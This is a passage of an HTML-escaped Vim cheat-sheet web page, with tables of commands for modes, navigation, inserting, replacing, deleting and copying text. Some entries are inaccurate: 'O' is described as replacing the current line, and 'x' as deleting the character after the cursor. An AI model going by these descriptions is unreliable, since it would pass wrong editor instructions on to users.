      &lt;li&gt;&lt;a href=&quot;#vim-copy-3-lines-of-text&quot; id=&quot;markdown-toc-vim-copy-3-lines-of-text&quot;&gt;Vim Copy 3 Lines of Text&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-copy-word&quot; id=&quot;markdown-toc-vim-copy-word&quot;&gt;Vim Copy Word&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-copy-3-words&quot; id=&quot;markdown-toc-vim-copy-3-words&quot;&gt;Vim Copy 3 Words&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-paste-commands&quot; id=&quot;markdown-toc-vim-paste-commands&quot;&gt;Vim Paste Commands&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#vim-search-commands&quot; id=&quot;markdown-toc-vim-search-commands&quot;&gt;Vim Search Commands&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-search-forward&quot; id=&quot;markdown-toc-vim-search-forward&quot;&gt;Vim Search forward&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-search-back&quot; id=&quot;markdown-toc-vim-search-back&quot;&gt;Vim Search Back&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#vim-search-and-replace-commands&quot; id=&quot;markdown-toc-vim-search-and-replace-commands&quot;&gt;Vim Search and Replace Commands&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-search-and-replace-first-instance&quot; id=&quot;markdown-toc-vim-search-and-replace-first-instance&quot;&gt;Vim Search and Replace First Instance&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-search-and-replace-on-a-single-line&quot; id=&quot;markdown-toc-vim-search-and-replace-on-a-single-line&quot;&gt;Vim Search and Replace on a Single Line&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-search-and-replace-entire-file&quot; id=&quot;markdown-toc-vim-search-and-replace-entire-file&quot;&gt;Vim Search and Replace Entire File&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-search-for-part-of-a-word&quot; id=&quot;markdown-toc-vim-search-for-part-of-a-word&quot;&gt;Vim Search for part of a Word&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-search-for-words-ending-with-string&quot; id=&quot;markdown-toc-vim-search-for-words-ending-with-string&quot;&gt;Vim Search for words ending with $string&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-search-for-metacharacters&quot; id=&quot;markdown-toc-vim-search-for-metacharacters&quot;&gt;Vim Search for Metacharacters&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-exact-match-search-only&quot; id=&quot;markdown-toc-vim-exact-match-search-only&quot;&gt;Vim Exact Match Search Only&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-search-for-a-range-of-strings&quot; id=&quot;markdown-toc-vim-search-for-a-range-of-strings&quot;&gt;Vim Search for a range of Strings&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-search-for-upper-and-lowercase&quot; id=&quot;markdown-toc-vim-search-for-upper-and-lowercase&quot;&gt;Vim Search for Upper and Lowercase&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#advanced-vim-commands&quot; id=&quot;markdown-toc-advanced-vim-commands&quot;&gt;Advanced Vim commands&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-view-options&quot; id=&quot;markdown-toc-vim-view-options&quot;&gt;Vim View Options&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-run-shell-commands&quot; id=&quot;markdown-toc-vim-run-shell-commands&quot;&gt;Vim Run Shell Commands&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-joining-lines&quot; id=&quot;markdown-toc-vim-joining-lines&quot;&gt;Vim Joining Lines&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-split-windows&quot; id=&quot;markdown-toc-vim-split-windows&quot;&gt;Vim Split Windows&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#vim-split-window-horizontally&quot; id=&quot;markdown-toc-vim-split-window-horizontally&quot;&gt;Vim Split Window Horizontally&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#vim-split-window-virtically&quot; id=&quot;markdown-toc-vim-split-window-virtically&quot;&gt;Vim Split Window Virtically&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-close-all-split-windows&quot; id=&quot;markdown-toc-vim-close-all-split-windows&quot;&gt;Vim Close All Split Windows&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#vim-save-commands&quot; id=&quot;markdown-toc-vim-save-commands&quot;&gt;Vim Save commands&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#how-to-save-in-vim&quot; id=&quot;markdown-toc-how-to-save-in-vim&quot;&gt;How to Save in Vim&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-save-and-exit&quot; id=&quot;markdown-toc-vim-save-and-exit&quot;&gt;Vim Save and Exit&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#misc-vim-commands&quot; id=&quot;markdown-toc-misc-vim-commands&quot;&gt;Misc Vim Commands&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-undo-command&quot; id=&quot;markdown-toc-vim-undo-command&quot;&gt;Vim Undo Command&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vim-undo-all&quot; id=&quot;markdown-toc-vim-undo-all&quot;&gt;Vim Undo All&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#vim-show-file-name&quot; id=&quot;markdown-toc-vim-show-file-name&quot;&gt;Vim Show File Name&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#vim-multipliers&quot; id=&quot;markdown-toc-vim-multipliers&quot;&gt;Vim Multipliers&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;A collection of Vim commands in a cheat sheet, handy reference document for learning / remembering Vi commands. I refer to Vim / Vi as the same thing in this document, but in most modern Linux distros vi is often a symlink to vim. However, you may want to check out Neovim if you’re on a mac use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brew install neovim&lt;/code&gt; or your package manager of choice on Linux.&lt;/p&gt;

&lt;p&gt;Mac users will need to swap Ctrl for CMD, and deal with the additional annoyance of using their thumbs instead of their pinkie finger.&lt;/p&gt;

&lt;h2 id=&quot;vim-insert-mode--command-mode&quot;&gt;Vim Insert mode &amp;amp; Command Mode&lt;/h2&gt;

&lt;p&gt;Vim has two basic modes, &lt;strong&gt;insert mode&lt;/strong&gt; - used for entering text and &lt;strong&gt;command mode&lt;/strong&gt;, used for entering commands. See the tip section below for switching between each mode.&lt;/p&gt;

&lt;h3 id=&quot;vim-insert-mode&quot;&gt;Vim Insert Mode&lt;/h3&gt;

&lt;p&gt;Enter vi insert mode, insert mode is used for inserting text.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;i&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Enter insert mode from command mode.&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;div class=&quot;note tip&quot;&gt;
  &lt;h5&gt;Vim Command Mode - Vim Insert Mode&lt;/h5&gt;
  &lt;p&gt;Vim has two modes, &lt;b&gt;insert mode&lt;/b&gt; for inserting text and &lt;b&gt;command mode&lt;/b&gt; a common mistake is attempting to edit in command mode. If you are unsure on what mode Vim is using double tap escape (enters command mode) and then hit &quot;i&quot; if you wish to enter insert mode.&lt;/p&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-command-mode&quot;&gt;Vim Command Mode&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;Esc&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Hit escape to enter command mode.&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;vim-file-navigvation&quot;&gt;Vim File Navigvation&lt;/h2&gt;

&lt;p&gt;Basic file navigation, how to move up, down, left and right.&lt;/p&gt;

&lt;div class=&quot;note tip&quot;&gt;
  &lt;h5&gt;Arrow Keys&lt;/h5&gt;
  &lt;p&gt;Modern Vim / Vim editors will allow you to use the arrow keys, but it's worth learning the correct way to navigate vi without using the arrow keys in case you come across Vim command line or a shell that doesn't like arrow keys.&lt;/p&gt;
&lt;/div&gt;

&lt;h3 id=&quot;move-up-down-left-and-right-in-vim&quot;&gt;Move up, down, left and right in Vim&lt;/h3&gt;

&lt;p&gt;You’ll need to be in command mode for these commands, navigation in vim uses &lt;strong&gt;h&lt;/strong&gt; &lt;strong&gt;j&lt;/strong&gt; &lt;strong&gt;k&lt;/strong&gt; &lt;strong&gt;l&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;h&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Move left - easy to remember h key is on the left&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
    &lt;td&gt;
      &lt;p&gt;&lt;code&gt;j&lt;/code&gt;&lt;/p&gt;
    &lt;/td&gt;
    &lt;td&gt;
          &lt;p&gt;Move down - I remember it with j(d)own for down&lt;/p&gt;
    &lt;/td&gt;
  &lt;/tr&gt;

   &lt;tr&gt;
   &lt;td&gt;
     &lt;p&gt;&lt;code&gt;k&lt;/code&gt;&lt;/p&gt;
   &lt;/td&gt;
   &lt;td&gt;
         &lt;p&gt;Move up - k for up - I remember it with (k)up&lt;/p&gt;
   &lt;/td&gt;
 &lt;/tr&gt;

   &lt;tr&gt;
   &lt;td&gt;
   &lt;p&gt;&lt;code&gt;l&lt;/code&gt;&lt;/p&gt;
   &lt;/td&gt;
   &lt;td&gt;
       &lt;p&gt;Move right - l is on the right side of hjkl and moves you right&lt;/p&gt;
    &lt;/td&gt;
   &lt;/tr&gt;

    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-page-down&quot;&gt;Vim Page Down&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;Ctrl+F &lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Vim move forward a page&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-half-a-page-down&quot;&gt;Vim Half a Page Down&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;Ctrl+D &lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Vim move half a page down&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-page-up&quot;&gt;Vim Page Up&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;Ctrl+B &lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Vim move up a page&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-half-a-page-up&quot;&gt;Vim Half a Page Up&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;Ctrl+U &lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Vim move up half a page&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;more-advanced-ways-of-entering-insert-mode&quot;&gt;More Advanced Ways of Entering Insert Mode&lt;/h2&gt;

&lt;h3 id=&quot;vim-insert-text-at-start-of-the-line&quot;&gt;Vim Insert Text at Start of the Line&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;I&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Insert text at the beginning of the line&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-insert-text-at-the-end-of-the-line&quot;&gt;Vim Insert Text at the end of the Line&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;A&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Appends text at the end of the line&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-append-text-to-the-right-of-the-cursor&quot;&gt;Vim Append text to the right of the Cursor&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;a&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Appends text to the right of the cursor&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;begin-a-new-line-below&quot;&gt;Begin a new line below&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;o&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Begin a new line, below the current line&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-replace-line&quot;&gt;Vim replace line&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;O&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Removes line, and allows you to type a new line in it's place&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;vim-replace&quot;&gt;Vim Replace&lt;/h2&gt;

&lt;h3 id=&quot;change-a-word-in-vim&quot;&gt;Change a Word in Vim&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;cw&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Replaces a single word, place cursor on first letter and hit cw (Change Word)&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;replace-line-but-not-wrapped-text&quot;&gt;Replace line, but not wrapped text&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;c$&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Replaces the current line but doesn’t extend to change the rest of a wrapped sentence on the screen&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-replace-character&quot;&gt;Vim Replace Character&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;r&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Replaces only the character under the cursor&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-replace-1&quot;&gt;Vim Replace&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;R&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Replaces over the top of existing text, until the user hits return.&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;vim-delete&quot;&gt;Vim Delete&lt;/h2&gt;

&lt;h3 id=&quot;vim-delete-single-character-after-the-cursor&quot;&gt;Vim Delete Single Character After the Cursor&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;x&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Vim deletes single character after the cursor&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-delete-character-before-the-cursor&quot;&gt;Vim Delete Character before the Cursor&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;X&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Vim deletes character before the cursor.&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-delete-word&quot;&gt;Vim Delete Word&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;dw&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Vim Delete Word, deleted the word under the cursor, from the curosr position onward&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;vim-delete-line-commands&quot;&gt;Vim Delete Line commands&lt;/h2&gt;

&lt;h3 id=&quot;vim-delete-line&quot;&gt;Vim Delete Line&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;dd&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Delete the current line in Vim&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-delete-until-end-of-line&quot;&gt;Vim Delete until end of Line&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;D&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Deletes from cursor to end of line&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;delete-to-end-of-screen&quot;&gt;Delete to end of screen&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;dL&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Deletes from cursor to end of screen&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;delete-to-end-of-file&quot;&gt;Delete to end of file&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;dG&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Deletes from cursor to end of file&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-delete-from-cursor-to-start-of-line&quot;&gt;Vim Delete From Cursor To Start of Line&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;d^&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Deletes from cursor to start of line&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;vim-copy-and-paste&quot;&gt;Vim Copy and Paste&lt;/h2&gt;

&lt;h3 id=&quot;vim-copy-line&quot;&gt;Vim Copy Line&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;yy&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Copies current line into unnamed buffer&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

